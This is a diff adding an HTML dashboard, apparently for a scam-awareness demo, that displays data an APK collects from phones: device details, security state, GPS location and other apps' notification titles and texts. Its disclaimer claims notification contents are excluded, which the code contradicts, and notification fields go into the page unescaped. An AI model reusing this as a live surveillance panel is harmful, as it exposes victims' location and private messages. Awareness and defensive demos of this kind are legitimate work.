@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ADMIN - What Scammer Gets</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Consolas, monospace
+        }
+
+        body {
+            background: #080a12;
+            color: #cbd5e1
+        }
+
+        .head {
+            background: #0f172a;
+            border-bottom: 2px solid #38bdf8;
+            padding: 14px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center
+        }
+
+        .head b {
+            color: #38bdf8
+        }
+
+        .live {
+            background: #052e16;
+            border: 1px solid #22c55e;
+            color: #22c55e;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700
+        }
+
+        .wrap {
+            padding: 16px;
+            max-width: 1200px;
+            margin: 0 auto
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 360px;
+            gap: 16px
+        }
+
+        @media(max-width:900px) {
+            .grid {
+                grid-template-columns: 1fr
+            }
+        }
+
+        .card {
+            background: #151e32;
+            border: 1px solid #1e293b;
+            border-radius: 10px;
+            overflow: hidden
+        }
+
+        .card h3 {
+            padding: 10px 14px;
+            background: #0f172a;
+            border-bottom: 1px solid #1e293b;
+            font-size: 12px;
+            color: #94a3b8
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse
+        }
+
+        th {
+            font-size: 10px;
+            color: #64748b;
+            padding: 8px 10px;
+            text-align: left;
+            background: #0f172a
+        }
+
+        td {
+            font-size: 12px;
+            padding: 10px;
+            border-bottom: 1px solid #1e293b30
+        }
+
+        tr:hover {
+            background: #ffffff05
+        }
+
+        .btn {
+            background: #38bdf8;
+            color: #000;
+            border: 0;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-weight: 700;
+            font-size: 11px;
+            cursor: pointer
+        }
+
+        tr.clickable {
+            cursor: pointer
+        }
+
+        tr.clickable:hover {
+            background: #1e293b
+        }
+
+        .kv {
+            display: flex;
+            justify-content: space-between;
+            gap: 16px;
+            padding: 8px 0;
+            border-bottom: 1px dashed #1e293b;
+            font-size: 13px
+        }
+
+        .kv b {
+            color: #64748b;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: .04em;
+            flex-shrink: 0
+        }
+
+        .kv span {
+            color: #e2e8f0;
+            text-align: right;
+            word-break: break-word
+        }
+
+        .section {
+            margin-bottom: 18px
+        }
+
+        .section h4 {
+            font-size: 11px;
+            color: #38bdf8;
+            letter-spacing: .08em;
+            margin-bottom: 8px
+        }
+
+        .cols {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px
+        }
+
+        @media (max-width:700px) {
+            .cols {
+                grid-template-columns: 1fr
+            }
+        }
+
+        .event {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            padding: 7px 0;
+            border-bottom: 1px solid #1e293b;
+            font-size: 12px
+        }
+
+        .event b {
+            color: #e2e8f0
+        }
+
+        .event span {
+            color: #64748b;
+            white-space: nowrap
+        }
+
+        .safe {
+            background: #052e16;
+            border: 1px solid #16a34a;
+            color: #4ade80;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 11px;
+            margin-top: 10px
+        }
+
+        #modal {
+            position: fixed;
+            inset: 0;
+            background: #000a;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 50;
+            padding: 20px
+        }
+
+        #modal.open {
+            display: flex
+        }
+
+        .box {
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 860px;
+            max-height: 92vh;
+            overflow: auto
+        }
+
+        .box-head {
+            padding: 14px 16px;
+            border-bottom: 1px solid #1e293b;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            background: #0f172a;
+            z-index: 1
+        }
+
+        pre {
+            background: #020617;
+            border: 1px solid #1e293b;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 10px;
+            white-space: pre-wrap;
+            margin-top: 10px;
+            color: #38bdf8
+        }
+
+        .notif-item {
+            padding: 8px 10px;
+            border-bottom: 1px solid #1e293b;
+            background: #0f172a;
+            margin-bottom: 6px;
+            border-left: 3px solid #38bdf8;
+            border-radius: 4px
+        }
+    </style>
+</head>
+
+<body>
+    <div class="head">
+        <div><b style="font-size:18px">SCAMMER VIEW</b></div>
+        <div style="display:flex;gap:8px"><span class="live" id="sock">CONNECTING</span><button onclick="loadAll()"
+                style="background:#1e293b;color:#fff;border:1px solid #334155;padding:5px 10px;border-radius:6px;cursor:pointer">Refresh</button>
+        </div>
+    </div>
+    <div class="wrap">
+        <div class="grid">
+            <div class="card">
+                <h3>Connected Devices (<span id="cnt">0</span>)</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Manufacturer / Model</th>
+                            <th>Android / SDK</th>
+                            <th>Battery / Network</th>
+                            <th>Location Perm</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tb">
+                        <tr>
+                            <td colspan="6" style="text-align:center;padding:30px;color:#475569">No data. Run Thunder
+                                Client POST /api/telemetry</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            <div class="card">
+                <h3>LIVE TELEMETRY FEED</h3>
+                <div id="feed" style="padding:10px;font-size:11px;max-height:400px;overflow:auto;color:#64748b">
+                    Waiting...</div>
+            </div>
+        </div>
+
+        <div class="card" style="margin-top:16px;">
+            <h3>Phone Notifications (<span id="notifCount">0</span>) <span
+                    style="float:right;color:#64748b;">Participant: <b id="notifPid"
+                        style="color:#38bdf8;">ALL</b></span></h3>
+            <div id="notifList" style="padding:10px;max-height:400px;overflow:auto;font-size:12px;">Waiting for phone
+                notifications...</div>
+        </div>
+
+    </div>
+    <div id="modal" onclick="if(event.target===this)closeM()">
+        <div class="box">
+            <div class="box-head"><b id="mid" style="color:#38bdf8"></b><span onclick="closeM()"
+                    style="cursor:pointer">X</span></div>
+            <div style="padding:16px" id="mbody"></div>
+        </div>
+    </div>
+    <script>
+        const socket = io();
+        let all = [];
+        let currentPid = null;
+
+        socket.on('connect', () => document.getElementById('sock').textContent = 'LIVE CONNECTED');
+        socket.on('telemetryUpdated', d => {
+            const f = document.getElementById('feed'); const div = document.createElement('div'); div.style.padding = '6px 0'; div.style.borderBottom = '1px solid #1e293b';
+            div.innerHTML = `<b style="color:#38bdf8">${d.participantId}</b> ${d.manufacturer} ${d.model} - Batt ${d.batteryPercentage}% - ${d.networkType} - Loc: ${d.locationPermission}`;
+            f.prepend(div); loadAll();
+        });
+
+        socket.on('notification:new', n => { addNotifUI(n); });
+        socket.on('phone-notif', n => { addNotifUI(n); });
+
+        function addNotifUI(n) {
+            const list = document.getElementById('notifList');
+            if (list.innerHTML.includes('Waiting')) list.innerHTML = '';
+            if (currentPid && n.participantId !== currentPid) return;
+            const el = document.createElement('div');
+            el.className = 'notif-item';
+            el.innerHTML = `<div style="display:flex;justify-content:space-between;"><b style="color:#38bdf8;">${n.packageName}</b><small style="color:#64748b;">${n.participantId} ${n.timestamp ? new Date(n.timestamp).toLocaleTimeString() : ''}</small></div><div style="color:white;margin:4px 0;"><b>${n.title || ''}</b></div><div style="color:#cbd5e1;">${n.text || ''}</div>`;
+            list.prepend(el);
+            document.getElementById('notifCount').textContent = list.children.length;
+        }
+
+        async function loadNotifications(pid) {
+            currentPid = pid || null;
+            document.getElementById('notifPid').textContent = pid || 'ALL';
+            const url = pid ? `/api/phone-notifications?participantId=${pid}` : '/api/phone-notifications';
+            const r = await fetch(url);
+            const data = await r.json();
+            const list = document.getElementById('notifList');
+            list.innerHTML = '';
+            if (data.length === 0) { list.innerHTML = 'No notifications'; document.getElementById('notifCount').textContent = '0'; return; }
+            data.forEach(n => {
+                const el = document.createElement('div');
+                el.className = 'notif-item';
+                el.innerHTML = `<div style="display:flex;justify-content:space-between;"><b style="color:#38bdf8;">${n.packageName}</b><small style="color:#64748b;">${n.participantId} ${n.timestamp ? new Date(n.timestamp).toLocaleTimeString() : ''}</small></div><div style="color:white;margin:4px 0;"><b>${n.title || ''}</b></div><div style="color:#cbd5e1;">${n.text || ''}</div>`;
+                list.appendChild(el);
+            });
+            document.getElementById('notifCount').textContent = data.length;
+        }
+
+        async function loadAll() {
+            try {
+                const r = await fetch('/api/sessions'); all = await r.json();
+                document.getElementById('cnt').textContent = all.length;
+                const tb = document.getElementById('tb');
+                if (!all.length) { tb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:30px;color:#475569">No data</td></tr>'; return }
+                tb.innerHTML = all.map(s => {
+                    const t = s.lastTelemetry || {}; const reg = s.registration || {};
+                    const pid = esc(s.participantId);
+                    return `<tr class="clickable" onclick="openM('${pid}')"><td style="color:#38bdf8"><b>${pid}</b><br><small style="color:#64748b">${esc(reg.name || '')}</small></td>
+   <td>${esc(t.manufacturer || '-')}<br><small style="color:#64748b">${esc(t.model || '')}</small></td>
+   <td>Android ${esc(t.androidVersion || '-')}<br><small>(SDK ${esc(t.sdkVersion)})</small></td>
+   <td>${t.batteryPercentage != null ? t.batteryPercentage + '%' : '-'} ${t.charging ? '(charging)' : '(not charging)'}<br><small>${esc(t.networkType || '—')}</small></td>
+   <td><span style="background:#1e293b;padding:2px 6px;border-radius:4px;font-size:10px">${esc(t.locationPermission || '-')}</span><br><small>${t.latitude != null && t.longitude != null ? esc(t.latitude) + ', ' + esc(t.longitude) : 'Location fix: none'}</small></td>
+   <td><button class="btn" onclick="event.stopPropagation(); openM('${pid}')">Full details</button></td></tr>`
+                }).join('');
+            } catch (e) { }
+        }
+
+        function esc(v) {
+            if (v == null || v === '') return '—';
+            return String(v)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;');
+        }
+
+        function fmtNum(v, digits) {
+            if (v == null || v === '' || Number.isNaN(Number(v))) return '—';
+            return Number(v).toFixed(digits);
+        }
+
+        function fmtTime(ts) {
+            if (ts == null || ts === '') return '—';
+            const n = Number(ts);
+            const d = Number.isFinite(n) ? new Date(n) : new Date(ts);
+            if (Number.isNaN(d.getTime())) return esc(ts);
+            return d.toLocaleString();
+        }
+
+        function kv(label, value, extra) {
+            return `<div class="kv"><b>${label}</b><span>${value}${extra || ''}</span></div>`;
+        }
+
+        function yesNo(v) {
+            if (v === true || v === 'true') return 'Yes';
+            if (v === false || v === 'false') return 'No';
+            return '—';
+        }
+
+        async function openM(pid) {
+            document.getElementById('modal').classList.add('open');
+            document.getElementById('mid').textContent = pid + ' — full payload';
+            document.getElementById('mbody').innerHTML = 'Loading...';
+            const r = await fetch('/api/session/' + encodeURIComponent(pid));
+            const d = await r.json();
+            const t = d.lastTelemetry || d.telemetry || {};
+            const events = Array.isArray(d.events) ? d.events : [];
+            const hasLoc = t.latitude != null && t.longitude != null && t.latitude !== '';
+            const mapLink = hasLoc
+                ? ` <a href="https://maps.google.com/?q=${encodeURIComponent(t.latitude)},${encodeURIComponent(t.longitude)}" target="_blank" rel="noopener" style="color:#38bdf8">Open map</a>`
+                : '';
+            const eventRows = events.length
+                ? events.map(e => `<div class="event"><b>${esc(e.eventType)}</b><span>${fmtTime(e.timestamp)}</span></div>`).join('')
+                : '<div class="event"><b>No events yet</b><span></span></div>';
+            const telemetryJson = JSON.stringify(t, null, 2);
+
+            document.getElementById('mbody').innerHTML = `
+<div class="cols">
+  <div class="section">
+    <h4>Device</h4>
+    ${kv('Participant ID', esc(d.participantId))}
+    ${kv('Stage', esc(d.currentStage))}
+    ${kv('Manufacturer', esc(t.manufacturer))}
+    ${kv('Model', esc(t.model))}
+    ${kv('Android', t.androidVersion != null ? esc(t.androidVersion) + ' (SDK ' + esc(t.sdkVersion) + ')' : '—')}
+    ${kv('Security patch', esc(t.securityPatch))}
+    ${kv('Screen', esc(t.screenResolution))}
+  </div>
+  <div class="section">
+    <h4>Power &amp; network</h4>
+    ${kv('Battery', t.batteryPercentage != null ? esc(t.batteryPercentage) + '%' : '—')}
+    ${kv('Charging', t.charging == null ? '—' : (t.charging ? 'Yes' : 'No'))}
+    ${kv('Network', esc(t.networkType))}
+    ${kv('VPN active', yesNo(t.isVpnActive))}
+    ${kv('ADB enabled', yesNo(t.isAdbEnabled))}
+    ${kv('Dark mode', yesNo(t.isDarkMode))}
+  </div>
+</div>
+<div class="cols">
+  <div class="section">
+    <h4>Location</h4>
+    ${kv('Permission', esc(t.locationPermission))}
+    ${kv('Latitude', t.latitude != null ? esc(t.latitude) : '—')}
+    ${kv('Longitude', t.longitude != null ? esc(t.longitude) : '—')}
+    ${kv('Fix', hasLoc ? esc(t.latitude) + ', ' + esc(t.longitude) : 'none', mapLink)}
+  </div>
+  <div class="section">
+    <h4>Environment</h4>
+    ${kv('RAM', t.totalRamGb != null ? fmtNum(t.totalRamGb, 1) + ' GB' : '—')}
+    ${kv('Free storage', t.availableStorageGb != null ? fmtNum(t.availableStorageGb, 1) + ' GB' : '—')}
+    ${kv('Uptime', t.systemUptimeHours != null ? esc(t.systemUptimeHours) + ' h' : '—')}
+    ${kv('Time zone', esc(t.timeZone))}
+    ${kv('Received at', fmtTime(t.timestamp))}
+  </div>
+</div>
+<div class="section">
+  <h4>Event timeline (${events.length})</h4>
+  ${eventRows}
+</div>
+<div class="safe">Awareness demo payload: device, battery, network, location permission/fix, and environment fields sent by the APK. This view does not include other apps' notification contents.</div>
+<details open class="section"><summary style="cursor:pointer;color:#94a3b8;font-size:11px">Raw telemetry JSON</summary>
+<pre>${esc(telemetryJson)}</pre></details>
+`;
+        }
+        function closeM() { document.getElementById('modal').classList.remove('open'); }
+        loadAll();
+        loadNotifications();
+        setInterval(() => { if (!document.getElementById('modal').classList.contains('open')) loadAll(); }, 3000);
+    </script>
+</body>
+
+</html>
